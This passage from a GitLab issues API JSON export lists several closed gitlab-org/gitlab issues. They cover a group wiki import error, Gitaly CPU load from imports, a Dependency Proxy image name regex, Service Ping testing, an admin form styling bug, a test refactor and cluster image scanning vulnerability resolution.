Chan","state":"active","avatar_url":"https://secure.gravatar.com/avatar/6dbe2781758eec51d1e476e10487e5f6?s=80\u0026d=identicon","web_url":"https://gitlab.com/JonstonChan"},"user_notes_count":20,"merge_requests_count":0,"upvotes":5,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/345925","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/345925","notes":"https://gitlab.com/api/v4/projects/278964/issues/345925/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/345925/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#345925","relative":"#345925","full":"gitlab-org/gitlab#345925"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":{"id":40214,"iid":46,"sequence":7,"group_id":9970,"title":"Pipeline Authoring: Jan 10, 2022 – Jan 23, 2022","description":"Target milestone `14.8`","state":3,"created_at":"2021-11-14T00:05:01.884Z","updated_at":"2022-01-24T00:05:02.043Z","start_date":"2022-01-10","due_date":"2022-01-23","web_url":"https://gitlab.com/groups/gitlab-org/-/iterations/40214"},"health_status":null},{"id":97494881,"iid":345923,"project_id":278964,"title":"GitLab Migration - Group Wiki Migration can fail with an exception","description":"### Summary\n\nWhen performing GitLab Migration we import both project and group wiki repositories. For groups that do not have wiki repositories an exception is raised during import: \n\n`Gitlab::Git::CommandError 2:fetch remote: \"remote: A repository for this group wiki does not exist yet.\\nfatal: repository 'http://gdk.test:3000/mygroup/testing-group.wiki.git/' not found\\n\": exit status 128.`\n\n### Steps to reproduce\n\n1. Use GitLab Migration for a group that does not have wiki\n2. Check `bulk_import_failures` table to see the error \n\n\u003c!-- Describe how one can reproduce the issue - this is very important. Please use an ordered list. --\u003e\n\n### What is the current *bug* behavior?\n\nException is raised\n\n### What is the expected *correct* behavior?\n\nWe should not raise an error in this case. Skip such group wiki if it's not present.","state":"closed","created_at":"2021-11-17T15:41:39.458Z","updated_at":"2021-12-02T14:36:34.942Z","closed_at":"2021-12-02T14:36:34.929Z","closed_by":{"id":674121,"username":"georgekoltsov","name":"George Koltsov","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/674121/avatar.png","web_url":"https://gitlab.com/georgekoltsov"},"labels":["Importer:GitLab Migration","Next Up","Unplanned","backend","customer","devops::manage","group::import","section::dev","type::bug"],"milestone":{"id":2114820,"iid":67,"group_id":9970,"title":"14.6","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-06-23T05:00:52.094Z","updated_at":"2022-04-21T07:26:38.271Z","due_date":"2021-12-17","start_date":"2021-11-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/67"},"assignees":[{"id":674121,"username":"georgekoltsov","name":"George Koltsov","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/674121/avatar.png","web_url":"https://gitlab.com/georgekoltsov"}],"author":{"id":674121,"username":"georgekoltsov","name":"George Koltsov","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/674121/avatar.png","web_url":"https://gitlab.com/georgekoltsov"},"type":"ISSUE","assignee":{"id":674121,"username":"georgekoltsov","name":"George Koltsov","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/674121/avatar.png","web_url":"https://gitlab.com/georgekoltsov"},"user_notes_count":5,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/345923","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/345923","notes":"https://gitlab.com/api/v4/projects/278964/issues/345923/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/345923/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#345923","relative":"#345923","full":"gitlab-org/gitlab#345923"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6681,"epic":{"id":342210,"iid":6681,"title":"GitLab Migration - Migrate Projects MVC","url":"/groups/gitlab-org/-/epics/6681","group_id":9970,"human_readable_end_date":"Dec 7, 2021","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":97493901,"iid":345922,"project_id":278964,"title":"External project imports generate Gitaly host CPU saturation","description":"\u003c!--\nTriage of infradev Issues is desired to occur asynchronously.\nFor maximum efficiency, please ensure the following, so that your infradev issues can gain maximum traction.\n\nhttps://about.gitlab.com/handbook/engineering/workflow/#a-guide-to-creating-effective-infradev-issues\n--\u003e\n\n## Summary\n\u003c!--\nClearly state the scope of the problem, and how it affects GitLab.com\n--\u003e\nGithub imports create many long-running transactions that cause apdex SLO incidents for engineers on call. This can create a noisy neighbor situation as CPU resources appear to be the primary bottleneck. These incidents also are un-actionable for those on call, and create un-needed work.\n\n\n## Impact\n\u003c!--\n- Quantify the effect of the problem to help ensure that correct prioritization occurs.\n- Include costs to availability. The Incident Budget Explorer dashboard can help here.\n- Include the number of times alerts have fired owing to the problem, how much time was spent dealing with the problem, and how many people were involved.\n- Link to affected incidents, and cross-reference them as related issues.\n- Include screenshots of visualization from Grafana or Kibana.\n- Always include a permalink to the source of the screenshot so that others can investigate further.\n--\u003e\n- Causes a degradation in our Gitaly host apdex.\n- Create un-actionable alerts and incidents for Engineers on Call.\n- CPU saturation can lead to poor performance for some other projects on the same Gitaly host.\n\nRelevant incidents:\n- https://gitlab.com/gitlab-com/gl-infra/production/-/issues/5917\n- https://gitlab.com/gitlab-com/gl-infra/production/-/issues/5911\n\nExample apdex metrics:\n- ![Screen_Shot_2021-11-16_at_3.27.08_PM](/uploads/112ffd99b4d865df7ac01c6600f00df5/Screen_Shot_2021-11-16_at_3.27.08_PM.png)[Source](https://dashboards.gitlab.net/d/gitaly-host-detail/gitaly-host-detail?viewPanel=877804374\u0026orgId=1\u0026var-PROMETHEUS_DS=Global\u0026var-environment=gprd\u0026var-fqdn=file-04-stor-gprd.c.gitlab-production.internal\u0026from=1636815600000\u0026to=1636819200000)\n- ![Screen_Shot_2021-11-16_at_3.29.08_PM](/uploads/c5141bd01318056af5abc9775de6e5df/Screen_Shot_2021-11-16_at_3.29.08_PM.png)[Source](https://dashboards.gitlab.net/d/gitaly-host-detail/gitaly-host-detail?viewPanel=877804374\u0026orgId=1\u0026from=1636655468324\u0026to=1636659684280\u0026var-PROMETHEUS_DS=Global\u0026var-environment=gprd\u0026var-fqdn=file-61-stor-gprd.c.gitlab-production.internal)\n\nExample Kibana logs for the most recent incident:\n- ![Screen_Shot_2021-11-16_at_3.50.15_PM](/uploads/eb42a8dcca92ecad1793b6394e673fe5/Screen_Shot_2021-11-16_at_3.50.15_PM.png)[Source](https://log.gprd.gitlab.net/goto/7bff18666a5571c18b6f38166299978e)\n\n\n## Recommendation\n\u003c!--\nProvide a clear, unambiguous, self-contained solution to the problem.\n--\u003e\nThrottle or rate limit the remote import process to minimize the impact on a Gitaly host node.\n\n\n## Verification\n\u003c!--\nProvide a method for validating that the original issue still exists.\n\nHaving a way of checking validity can save on a great deal of back-and-forth discussion between Infradev Triage participants including Engineering Managers, Directors and Product Managers and make space for other non-resolved issues to get scheduled sooner.\n\nIdeally, provide a link to a Thanos query or an ELK query and clear instructions on how to interpret the results to determine whether the problem is still occurring.\n--\u003e\nThe best way I can think of is to perform our own imports of large public projects to see if we can validate the solution is working. We can also refer to logs for long running and high volume `UserCreateBranch` and `CommitDiff` method calls in Gitaly.\n\n\n\u003c!--\nWorkflow and other relevant labels\n\nSee also:\n- https://about.gitlab.com/handbook/engineering/quality/issue-triage/#availability\n- https://about.gitlab.com/handbook/product/categories/\n- https://gitlab.com/gitlab-com/www-gitlab-com/blob/master/data/stages.yml\n--\u003e","state":"closed","created_at":"2021-11-17T15:23:46.387Z","updated_at":"2022-03-24T13:29:37.570Z","closed_at":"2022-03-11T09:57:54.794Z","closed_by":{"id":4391348,"username":"sean_carroll","name":"Sean Carroll","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4391348/avatar.png","web_url":"https://gitlab.com/sean_carroll"},"labels":["Category:Source Code Management","Deliverable","Eng-Consumer::Infrastructure","Eng-Producer::Development","Engineering Allocation","backend","devops::create","group::source code","infradev","priority::2","section::dev","severity::2","spike","type::bug","workflow::verification"],"milestone":{"id":2204140,"iid":71,"group_id":9970,"title":"14.9","description":"","state":"active","created_at":"2021-08-26T19:11:46.841Z","updated_at":"2022-03-22T13:29:17.028Z","due_date":"2022-03-17","start_date":"2022-02-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/71"},"assignees":[{"id":421631,"username":"vyaklushin","name":"Vasilii Iakliushin","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/421631/avatar.png","web_url":"https://gitlab.com/vyaklushin"}],"author":{"id":194566,"username":"cmcfarland","name":"Cameron McFarland","state":"active","avatar_url":"https://secure.gravatar.com/avatar/0fea59864aa5c034e15089251bf9fa8f?s=80\u0026d=identicon","web_url":"https://gitlab.com/cmcfarland"},"type":"ISSUE","assignee":{"id":421631,"username":"vyaklushin","name":"Vasilii Iakliushin","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/421631/avatar.png","web_url":"https://gitlab.com/vyaklushin"},"user_notes_count":42,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/345922","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/345922","notes":"https://gitlab.com/api/v4/projects/278964/issues/345922/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/345922/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#345922","relative":"#345922","full":"gitlab-org/gitlab#345922"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":97492291,"iid":345920,"project_id":278964,"title":"Allow Dependency Proxy to pull images more than one level deep","description":"## Problem\n\nIf you try to pull an image with the Dependency Proxy that is more than one level deep (more than one `/` in the image name), a 404 will occur and the image pull will fail. There is no known workaround.\n\n## Solution\n\nThe [regex used to validate the image name](https://gitlab.com/gitlab-org/gitlab/-/blob/ebd8113848c5a8be69d872899499cda71aee681a/lib/gitlab/path_regex.rb#L258) should be updated to allow more than one slash.\n\nProposed regex:\n```\n([\\w\\.-_]+\\/){0,4}[\\w\\.-_]+\n```\n\n### Notes\n\nThis can be reproduced by pulling an image with more than one slash in it's name:\n\n```sh\n→ docker pull gdk.test:3001/asdfasdfasdf/dependency_proxy/containers/mcr.microsoft.com/dotnet/sdk:latest\nError response from daemon: error parsing HTTP 404 response body: unexpected end of JSON input: \"\"\n```\n\nThen looking in the rails logs we see the route is unmatched:\n\n```ruby\nStarted GET \"/v2/asdfasdfasdf/dependency_proxy/containers/mcr.microsoft.com/dotnet/sdk/manifests/latest\" for 172.16.123.1 at 2021-11-17 07:52:28 -0700\nProcessing by ApplicationController#route_not_found as JSON\n  Parameters: {\"unmatched_route\"=\u003e\"v2/asdfasdfasdf/dependency_proxy/containers/mcr.microsoft.com/dotnet/sdk/manifests/latest\"}\nRedirected to http://gdk.test:3001/users/sign_in\nCompleted 302 Found in 4ms (ActiveRecord: 0.0ms | Elasticsearch: 0.0ms | Allocations: 2376)\n\n\nStarted GET \"/users/sign_in\" for 172.16.123.1 at 2021-11-17 07:52:28 -0700\nProcessing by SessionsController#new as JSON\n   (0.5ms)  SELECT COUNT(*) FROM (SELECT 1 AS one FROM \"users\" LIMIT 2) subquery_for_count /*application:web,correlation_id:01FMQ651JZKF10DPCYTWK6JVFF,db_config_name:main,line:/app/controllers/sessions_controller.rb:182:in `check_initial_setup'*/\n  ↳ app/controllers/sessions_controller.rb:182:in `check_initial_setup'\nCompleted 404 Not Found in 9ms (ActiveRecord: 0.5ms | Elasticsearch: 0.0ms | Allocations: 3647)\n```\n\nThe [route itself matches](https://gitlab.com/gitlab-org/gitlab/-/blob/e34fac9528f3b04a5e98a92d9405e7586262216b/config/routes/group.rb#L154), but there is a constraint on the image param, evaluating it against a [regex](https://gitlab.com/gitlab-org/gitlab/-/blob/ebd8113848c5a8be69d872899499cda71aee681a/lib/gitlab/path_regex.rb#L258), which causes the match to fail.","state":"closed","created_at":"2021-11-17T15:09:27.448Z","updated_at":"2022-02-22T14:55:57.763Z","closed_at":"2022-02-22T14:55:57.710Z","closed_by":{"id":4059254,"username":"sabrams","name":"Steve Abrams","state":"active","avatar_url":"https://secure.gravatar.com/avatar/cac831f7b515c191dfba32c54f01c375?s=80\u0026d=identicon","web_url":"https://gitlab.com/sabrams"},"labels":["Category:Dependency Proxy","backend","customer","devops::package","group::package registry","ruby","section::ops","type::feature","workflow::production"],"milestone":{"id":2204140,"iid":71,"group_id":9970,"title":"14.9","description":"","state":"active","created_at":"2021-08-26T19:11:46.841Z","updated_at":"2022-03-22T13:29:17.028Z","due_date":"2022-03-17","start_date":"2022-02-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/71"},"assignees":[{"id":4059254,"username":"sabrams","name":"Steve Abrams","state":"active","avatar_url":"https://secure.gravatar.com/avatar/cac831f7b515c191dfba32c54f01c375?s=80\u0026d=identicon","web_url":"https://gitlab.com/sabrams"}],"author":{"id":4059254,"username":"sabrams","name":"Steve Abrams","state":"active","avatar_url":"https://secure.gravatar.com/avatar/cac831f7b515c191dfba32c54f01c375?s=80\u0026d=identicon","web_url":"https://gitlab.com/sabrams"},"type":"ISSUE","assignee":{"id":4059254,"username":"sabrams","name":"Steve Abrams","state":"active","avatar_url":"https://secure.gravatar.com/avatar/cac831f7b515c191dfba32c54f01c375?s=80\u0026d=identicon","web_url":"https://gitlab.com/sabrams"},"user_notes_count":22,"merge_requests_count":0,"upvotes":2,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/345920","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/345920","notes":"https://gitlab.com/api/v4/projects/278964/issues/345920/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/345920/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#345920","relative":"#345920","full":"gitlab-org/gitlab#345920"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6061,"epic":{"id":276767,"iid":6061,"title":"Generic image registry support for dependency proxy","url":"/groups/gitlab-org/-/epics/6061","group_id":9970,"human_readable_end_date":"Mar 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":97488596,"iid":345914,"project_id":278964,"title":"Spike: Test automated GitLab.com Service Ping","description":"**Task:** Find out how we could validate issues with the the new automated Service Ping during development.\nHow to act **preventively** rather than do the **corrective** measures when it comes to testing automated `service ping` for new metrics.\n\n**Deliverables**\n- Proposal how to test the automated Service Ping\n- Optional: Maybe think about complete e2e tests for Service Ping. From an instance to the Datawarehouse. See https://gitlab.com/groups/gitlab-org/-/epics/7034#note_729699867\n- Create Issues\n\nPlease have a look into the discussion here: https://gitlab.com/groups/gitlab-org/-/epics/7034#note_727936347","state":"closed","created_at":"2021-11-17T14:28:02.348Z","updated_at":"2022-01-18T07:02:52.705Z","closed_at":"2021-12-22T14:25:56.542Z","closed_by":{"id":5365921,"username":"alinamihaila","name":"Alina Mihaila","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5365921/avatar.png","web_url":"https://gitlab.com/alinamihaila"},"labels":["Deliverable","auto updated","backend","devops::growth","group::product intelligence","section::growth","spike","workflow::ready for development"],"milestone":{"id":2156369,"iid":68,"group_id":9970,"title":"14.7","description":"","state":"active","created_at":"2021-07-21T17:39:41.786Z","updated_at":"2021-07-21T17:39:41.786Z","due_date":"2022-01-17","start_date":"2021-12-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/68"},"assignees":[{"id":5365921,"username":"alinamihaila","name":"Alina Mihaila","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5365921/avatar.png","web_url":"https://gitlab.com/alinamihaila"}],"author":{"id":3509693,"username":"nicolasdular","name":"Nicolas Dular","state":"active","avatar_url":"https://secure.gravatar.com/avatar/c4a21f15150c12ddf13fd848597cddd9?s=80\u0026d=identicon","web_url":"https://gitlab.com/nicolasdular"},"type":"ISSUE","assignee":{"id":5365921,"username":"alinamihaila","name":"Alina Mihaila","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5365921/avatar.png","web_url":"https://gitlab.com/alinamihaila"},"user_notes_count":4,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/345914","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":5,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/345914","notes":"https://gitlab.com/api/v4/projects/278964/issues/345914/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/345914/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#345914","relative":"#345914","full":"gitlab-org/gitlab#345914"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7034,"epic":{"id":378957,"iid":7034,"title":"Test automated GitLab.com Service Ping","url":"/groups/gitlab-org/-/epics/7034","group_id":9970,"human_readable_end_date":"Mar 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":97486876,"iid":345912,"project_id":278964,"title":"Admin input for \"default deletion delay\" appears to be disabled when it's not","description":"\u003c!---\nPlease read this!\n\nBefore opening a new issue, make sure to search for keywords in the issues\nfiltered by the \"regression\" or \"type::bug\" label:\n\n- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=regression\n- https://gitlab.com/gitlab-org/gitlab/issues?label_name%5B%5D=type::bug\n\nand verify the issue you're about to submit isn't a duplicate.\n---\u003e\n\n### Summary\n\n\u003c!-- Summarize the bug encountered concisely. --\u003e\n\nThe form-input is appearing disabled, even on hover but it is not.\n\n\n### Steps to reproduce\n\n\u003c!-- Describe how one can reproduce the issue - this is very important. Please use an ordered list. --\u003e\n\n1. Add at least a ~\"GitLab Premium\" license to your instance\n1. Go to `Admin Area \u003e Settings \u003e General \u003e Visibility and access controls`\n1. Interact with the form-input\n\n### What is the current *bug* behavior?\n\n\u003c!-- Describe what actually happens. --\u003e\n\nInput looks disabled and is a `form-select`\n\n![image](/uploads/c5bd7ec74a7d5f8f100e06e7fdc4d80f/image.png)\n\n### What is the expected *correct* behavior?\n\n\u003c!-- Describe what you should see instead. --\u003e\n\nIt shouldn't look this way :smile_cat:. It also should match the other form inputs on the page with an incremental ticker.\n\n![image](/uploads/e449f02c703a83d2dc3890f637bcb9c6/image.png) \n\n### Relevant logs and/or screenshots\n\n\u003c!-- Paste any relevant logs - please use code blocks (```) to format console output, logs, and code\n as it's tough to read otherwise. --\u003e\n\n![Bug](/uploads/aca10f585a4e0f2da1ad3a8fc08897b3/Bug.gif)\n\n### Output of checks\n\n\u003c!-- If you are reporting a bug on GitLab.com, write: This bug happens on GitLab.com --\u003e\n\n#### Results of GitLab environment info\n\n\u003c!--  Input any relevant GitLab environment information if needed. --\u003e\n\n\u003cdetails\u003e\n\u003csummary\u003eExpand for output related to GitLab environment info\u003c/summary\u003e\n\n\u003cpre\u003e\n\n(For installations with omnibus-gitlab package run and paste the output of:\n`sudo gitlab-rake gitlab:env:info`)\n\n(For installations from source run and paste the output of:\n`sudo -u git -H bundle exec rake gitlab:env:info RAILS_ENV=production`)\n\n\u003c/pre\u003e\n\u003c/details\u003e\n\n#### Results of GitLab application Check\n\n\u003c!--  Input any relevant GitLab application check information if needed. --\u003e\n\n\u003cdetails\u003e\n\u003csummary\u003eExpand for output related to the GitLab application check\u003c/summary\u003e\n\u003cpre\u003e\n\n(For installations with omnibus-gitlab package run and paste the output of:\n`sudo gitlab-rake gitlab:check SANITIZE=true`)\n\n(For installations from source run and paste the output of:\n`sudo -u git -H bundle exec rake gitlab:check RAILS_ENV=production SANITIZE=true`)\n\n(we will only investigate if the tests are passing)\n\n\u003c/pre\u003e\n\u003c/details\u003e\n\n### Possible fixes\n\n\u003c!-- If you can, link to the line of code that might be responsible for the problem. --\u003e","state":"closed","created_at":"2021-11-17T14:05:54.971Z","updated_at":"2022-05-18T18:49:50.745Z","closed_at":"2022-05-18T18:49:50.732Z","closed_by":{"id":5209897,"username":"rob.hunt","name":"Robert Hunt","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5209897/avatar.png","web_url":"https://gitlab.com/rob.hunt"},"labels":["SUS::Impacting","UX","devops::manage","frontend","group::compliance","maintenance::usability","priority::4","section::dev","severity::4","type::maintenance","workflow::verification"],"milestone":null,"assignees":[{"id":5209897,"username":"rob.hunt","name":"Robert Hunt","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5209897/avatar.png","web_url":"https://gitlab.com/rob.hunt"}],"author":{"id":6193108,"username":"aregnery","name":"Austin Regnery","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/6193108/avatar.png","web_url":"https://gitlab.com/aregnery"},"type":"ISSUE","assignee":{"id":5209897,"username":"rob.hunt","name":"Robert Hunt","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5209897/avatar.png","web_url":"https://gitlab.com/rob.hunt"},"user_notes_count":4,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/345912","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/345912","notes":"https://gitlab.com/api/v4/projects/278964/issues/345912/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/345912/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#345912","relative":"#345912","full":"gitlab-org/gitlab#345912"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":5936,"epic":{"id":264716,"iid":5936,"title":"Bugs with deletion of projects","url":"/groups/gitlab-org/-/epics/5936","group_id":9970,"human_readable_end_date":"Jan 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":97485903,"iid":345910,"project_id":278964,"title":"Refactor createWrapper fn in wiki_form_spec.js file","description":"The following discussion from !74457 should be addressed:\n\n- [ ] @justin_ho started a [discussion](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/74457#note_735407994): \n\n    \u003e Suggestion (non-blocking): I know it was like this before the MR but wdyt about changing this whole call to be a more standard `createComponent` function with named params? \n    \u003e \n    \u003e I also think we can move the `glFeatures` fallback to use destructuring to make this more readable. Or we can just ignore the `wikiSwitchBetweenContentEditorRawMarkdown: false` part since if we don't pass it, it will fallback to a falsy value anyway. (This is mostly personal preference so feel free to ignore)\n    \u003e \n    \u003e Here is what this translates to in terms of code:\n    \u003e ```js\n    \u003e   const createComponent = ({ persisted, mountFn = mountExtended, pageInfo = {}, glFeatures = {} } = {}) =\u003e {\n    \u003e   wrapper = mountFn(WikiForm, {\n    \u003e     provide: {\n    \u003e       formatOptions,\n    \u003e       glFeatures: {\n    \u003e         { wikiSwitchBetweenContentEditorRawMarkdown: false }, // this is optional\n    \u003e         ...glFeatures\n    \u003e       },\n    \u003e       // ...\n    \u003e     }\n    \u003e   })\n    \u003e })\n    \u003e ```\n    \u003e Of course this would take a bit more effort to update all calls so feel free to handle in a follow-up.\n\n### Testing\n\nPlease run `package-and-qa` job in MR for regression purposes.","state":"closed","created_at":"2021-11-17T13:52:38.668Z","updated_at":"2022-01-18T07:01:19.156Z","closed_at":"2022-01-07T16:17:27.463Z","closed_by":{"id":3540517,"username":"ealcantara","name":"Enrique Alcántara","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3540517/avatar.png","web_url":"https://gitlab.com/ealcantara"},"labels":["Deliverable","auto updated","devops::create","frontend","group::editor","maintenance::refactor","quad-planning::complete-action","section::dev","workflow::ready for development"],"milestone":{"id":2156369,"iid":68,"group_id":9970,"title":"14.7","description":"","state":"active","created_at":"2021-07-21T17:39:41.786Z","updated_at":"2021-07-21T17:39:41.786Z","due_date":"2022-01-17","start_date":"2021-12-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/68"},"assignees":[{"id":3540517,"username":"ealcantara","name":"Enrique Alcántara","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3540517/avatar.png","web_url":"https://gitlab.com/ealcantara"}],"author":{"id":3540517,"username":"ealcantara","name":"Enrique Alcántara","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3540517/avatar.png","web_url":"https://gitlab.com/ealcantara"},"type":"ISSUE","assignee":{"id":3540517,"username":"ealcantara","name":"Enrique Alcántara","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3540517/avatar.png","web_url":"https://gitlab.com/ealcantara"},"user_notes_count":4,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/345910","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":1,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":true,"task_status":"0 of 1 checklist item completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/345910","notes":"https://gitlab.com/api/v4/projects/278964/issues/345910/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/345910/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#345910","relative":"#345910","full":"gitlab-org/gitlab#345910"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":97483973,"iid":345905,"project_id":278964,"title":"Cluster image scanning vulnerability resolution","description":"\u003c!--\nImplementation issues are used break-up a large piece of work into small, discrete tasks that can\nmove independently through the build workflow steps. They're typically used to populate a Feature\nEpic. Once created, an implementation issue is usually refined in order to populate and review the\nimplementation plan and weight.\nExample workflow: https://about.gitlab.com/handbook/engineering/development/threat-management/planning/diagram.html#plan\n--\u003e\n\n## Why are we doing this work\n\u003c!--\nA brief explanation of the why, not the what or how. Assume the reader doesn't know the\nbackground and won't have time to dig-up information from comment threads.\n--\u003e\n\nThe agent implementation of Cluster Image Scanning currently does not have any means of determining if a vulnerability is no longer detected. Historically, all security scans have run in GitLab CI/CD and have been able to make use of [`StoreReportService`](https://gitlab.com/gitlab-org/gitlab/-/blob/deb20688a6b9e5da1d23a671dc704837231daf5e/ee/app/services/security/store_report_service.rb#L48) in order to compare scans with one another and resolve / deduplicate findings. The agent uses an HTTP API which currently can only create vulnerabilities. We will need to implement a method of resolving findings which are no longer detected via the API.\n\n## Relevant links\n\u003c!--\nInformation that the developer might need to refer to when implementing the issue.\n\n- [Design Issue](https://gitlab.com/gitlab-org/gitlab/-/issues/\u003cid\u003e)\n  - [Design 1](https://gitlab.com/gitlab-org/gitlab/-/issues/\u003cid\u003e/designs/\u003cimage\u003e.png)\n  - [Design 2](https://gitlab.com/gitlab-org/gitlab/-/issues/\u003cid\u003e/designs/\u003cimage\u003e.png)\n- [Similar implementation](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/\u003cid\u003e)\n--\u003e\n\n\n## Non-functional requirements\n\u003c!--\nAdd details for required items and delete others.\n--\u003e\n\n- [ ] Documentation:\n- [ ] Feature flag:\n- [ ] Performance:\n- [ ] Testing:\n\n\n## Implementation plan\n\u003c!--\nSteps and the parts of the code that will need to get updated. The plan can also\ncall-out responsibilities for other team members or teams.\n\ne.g.:\n\n- [ ] ~frontend Step 1\n  - [ ] `@person` Step 1a\n- [ ] ~frontend Step 2\n\n--\u003e\n\n1. ~backend (rails) Update `starboard_vulnerability` internal API to return the UUID of the vulnerability which was created\n1. ~backend (rails) Add a new API endpoint (`POST internal/kubernetes/modules/starboard_vulnerability/scan_result` ?) which receives a list of 